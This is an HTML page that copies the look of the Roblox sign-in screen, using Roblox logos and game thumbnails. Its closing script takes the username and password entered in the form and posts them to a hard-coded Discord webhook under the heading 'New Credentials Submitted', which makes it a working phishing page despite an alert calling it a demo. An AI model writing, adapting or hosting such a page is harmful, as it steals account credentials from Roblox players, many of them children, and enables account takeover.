<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Roblox - Sign In</title>
  <style>
    /* Reset and base */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family:
        "Helvetica Neue", Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #0b0b0b;
      color: #ddd;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    /* === Header/Nav === */
    .top-nav {
      display: flex;
      align-items: center;
      height: 52px;
      background-color: #111;
      padding: 0 20px;
      border-bottom: 1px solid #222;
      user-select: none;
      position: fixed;
      width: 100%;
      top: 0;
      z-index: 10;
    }

    .top-nav .logo {
      width: 18px;
      height: 18px;
      margin-right: 16px;
      background: url("https://static.rbxcdn.com/mac/mac-nav-logo.svg") no-repeat center;
      background-size: contain;
      filter: brightness(100%);
    }

    .nav-links {
      display: flex;
      gap: 22px;
      font-weight: 600;
      font-size: 13px;
    }

    .nav-links a {
      text-decoration: none;
      color: #ddd;
      padding-bottom: 3px;
      border-bottom: 2px solid transparent;
      transition: 0.25s ease-in-out;
    }

    .nav-links a:hover,
    .nav-links a.active {
      color: white;
      border-bottom-color: #3b82f6;
    }

    .nav-search {
      margin-left: 20px;
      flex: 1;
      max-width: 400px;
      position: relative;
    }

    .nav-search input {
      width: 100%;
      padding: 6px 12px;
      background-color: #222;
      border: 1px solid #333;
      border-radius: 5px;
      color: #bbb;
      font-size: 13px;
    }

    .nav-search input::placeholder {
      color: #666;
    }

    .create-btn {
      background-color: #3578e5;
      border: none;
      color: white;
      padding: 7px 16px;
      font-size: 14px;
      font-weight: 600;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.3s;
      margin-left: 20px;
      white-space: nowrap;
    }

    .create-btn:hover {
      background-color: #2c65c4;
    }

    /* === Main layout === */
    .main {
      display: flex;
      height: calc(100vh - 52px);
      padding-top: 52px;
    }

    /* === Left sign-in panel === */

    .left {
      width: 360px;
      background-color: #121212;
      color: #ddd;
      padding: 50px 40px 60px 40px;
      display: flex;
      flex-direction: column;
      justify-content: center;
    }

    .left h1 {
      font-size: 26px;
      font-weight: 700;
      margin-bottom: 8px;
      color: white;
    }

    .left p {
      margin-bottom: 24px;
      font-size: 16px;
      color: #aaa;
    }

    label {
      font-size: 14px;
      font-weight: 600;
      color: #ccc;
      display: block;
      margin-bottom: 6px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      background-color: #222;
      border: 1px solid #444;
      border-radius: 4px;
      padding: 10px 12px;
      color: #eee;
      font-size: 15px;
      outline-offset: 2px;
      transition: border-color 0.2s;
    }

    input[type="text"]::placeholder,
    input[type="password"]::placeholder {
      color: #777;
    }

    input[type="text"]:focus,
    input[type="password"]:focus {
      border-color: #3b82f6;
      background-color: #1e1e1e;
    }

    .signin-btn {
      background-color: #3578e5;
      border: none;
      border-radius: 4px;
      padding: 11.5px 0;
      margin-top: 12px;
      font-size: 16px;
      font-weight: 700;
      color: white;
      cursor: pointer;
      width: 100%;
      transition: background-color 0.3s;
    }

    .signin-btn:hover {
      background-color: #2c65c4;
    }

    .forgot {
      font-size: 14px;
      text-align: center;
      margin: 16px 0;
    }

    .forgot a {
      color: #3578e5;
      text-decoration: none;
      font-weight: 600;
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 20px 0 18px 0;
    }

    .divider span {
      flex-grow: 1;
      height: 1.3px;
      background-color: #444;
    }

    .divider p {
      margin: 0 12px;
      font-size: 14px;
      color: #666;
      font-weight: 600;
      white-space: nowrap;
    }

    .alt-btn {
      background-color: #1e1e1e;
      border: none;
      border-radius: 4px;
      width: 100%;
      padding: 11px 0;
      font-weight: 600;
      font-size: 14px;
      margin-bottom: 10px;
      color: #cfcfcf;
      cursor: pointer;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 5px;
      transition: background-color 0.2s;
    }

    .alt-btn:hover {
      background-color: #242424;
    }

    .signup {
      text-align: center;
      font-size: 13px;
      color: #aaa;
      margin-top: 12px;
    }

    .signup a {
      color: #3578e5;
      text-decoration: none;
      font-weight: 600;
    }

    /* === Right side tiled rotatable images === */

    .right {
      flex: 1;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #000;
      padding: 28px;
      overflow: hidden;
    }

    .tiles {
      width: 630px;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 35px 35px;
      position: relative;
    }

    .tile {
      width: 140px;
      height: 140px;
      background-color: #111;
      border-radius: 16px;
      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.9);
      overflow: hidden;
      cursor: pointer;
      position: relative;
      transform-origin: center;
      transition: transform 0.3s ease;
    }

    .tile img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      user-select: none;
      pointer-events: none;
      display: block;
      border-radius: 16px;
    }

    /* Random rotation mimics Roblox look */
    .tile:nth-child(1) {
      transform: rotate(-9deg);
      z-index: 9;
    }

    .tile:nth-child(2) {
      transform: rotate(5deg);
      z-index: 8;
    }

    .tile:nth-child(3) {
      transform: rotate(-6deg);
      z-index: 7;
    }

    .tile:nth-child(4) {
      transform: rotate(7deg);
      z-index: 6;
    }

    .tile:nth-child(5) {
      transform: rotate(-3deg);
      z-index: 5;
    }

    .tile:nth-child(6) {
      transform: rotate(4deg);
      z-index: 4;
    }

    /* On hover straighten and scale up tile */
    .tile:hover {
      transform: rotate(0deg) scale(1.12);
      box-shadow: 0 16px 52px rgba(59, 130, 246, 0.75);
      z-index: 20 !important;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }

    /* Responsive */
    @media (max-width: 900px) {
      .right {
        display: none;
      }

      .left {
        width: 100%;
        padding: 40px 30px 40px 30px;
      }
    }
  </style>
</head>

<body>
  <nav class="top-nav" role="navigation">
    <div class="logo" aria-label="Roblox logo"></div>
    <div class="nav-links" role="menubar" aria-label="Primary navigation">
      <a href="#" class="active" role="menuitem" tabindex="0">Charts</a>
      <a href="#" role="menuitem" tabindex="-1">Marketplace</a>
      <a href="#" role="menuitem" tabindex="-1">Create</a>
      <a href="#" role="menuitem" tabindex="-1">Robux</a>
    </div>
    <div class="nav-search">
      <input type="search" aria-label="Search Roblox" placeholder="Search" />
    </div>
    <button class="create-btn" aria-label="Create account">Create account</button>
  </nav>

  <main class="main" role="main">
    <section class="left" aria-label="Sign-in panel">
      <h1>Sign in</h1>
      <p>Jump back into your experiences</p>

      <form id="loginForm" autocomplete="off">
        <label for="username">Username, email, or phone</label>
        <input id="username" name="username" type="text" required autocomplete="username" placeholder="Username, email, or phone" />

        <label for="password" style="margin-top:18px">Password</label>
        <input id="password" name="password" type="password" required autocomplete="current-password" placeholder="Password" />

        <button class="signin-btn" type="submit">Sign in</button>
      </form>

      <div class="forgot">
        <a href="#">Forgot password or username?</a>
      </div>

      <div class="divider">
        <span></span>
        <p>Or</p>
        <span></span>
      </div>

      <button class="alt-btn" type="button" aria-label="Email a code">ðŸ“§ Email a code</button>
      <button class="alt-btn" type="button" aria-label="Quick sign in">ðŸ”‘ Quick sign in</button>

      <div class="signup">
        Don't have an account? <a href="#">Create one</a>
      </div>
    </section>

    <aside class="right" aria-label="Games preview collage">
      <div class="tiles">
        <div class="tile" title="Jailbreak"><img src="https://t6.rbxcdn.com/d24f61f22643a8d2dd26c131ccdea070" alt="Jailbreak" /></div>
        <div class="tile" title="Shark Bitez"><img src="https://t6.rbxcdn.com/e7e959d38f346374f0626c9f31e8a66a" alt="Shark Bitez" /></div>
        <div class="tile" title="World Zero"><img src="https://t7.rbxcdn.com/545b1110d39c55e944f9e3bfeff834ea" alt="World Zero" /></div>
        <div class="tile" title="Toilet Tower Defense"><img src="https://t6.rbxcdn.com/6b6195b8a0f7235497e0c493f66a1e03" alt="Toilet Tower Defense" /></div>
        <div class="tile" title="Doors"><img src="https://t6.rbxcdn.com/c9d7853aab89502f449d99a09c903f63" alt="Doors" /></div>
        <div class="tile" title="Tower World"><img src="https://t5.rbxcdn.com/8208fdbb9ded9cab89079c2a8bcfcae5" alt="Tower World" /></div>
      </div>
    </aside>
  </main>

  <script>
    // Webhook sending on form submission
    document.getElementById("loginForm").addEventListener("submit", (e) => {
      e.preventDefault();

      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value;

      if (!username || !password) {
        alert("Please fill in both fields.");
        return;
      }

      const content = ` **New Credentials Submitted** \n **Username/Email/Phone:** ${username}\n **Password:** ${password}`;

      fetch(
        "https://discord.com/api/webhooks/1477207175607619606/QRToJeCw3f5Psff9_81PRwwOMAdsyUboelWzFuqrel1OG2eIcHqqqGvgOAoWIfP470vc",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content })
        }
      )
        .then((res) => {
          if (res.ok) {
            alert("This is a demo page. Credentials sent to Discord webhook.");
            e.target.reset();
          } else {
            alert("Failed to send data.");
          }
        })
        .catch((err) => {
          alert("Error sending data: " + err.message);
        });
    });
  </script>
</body>

</html>
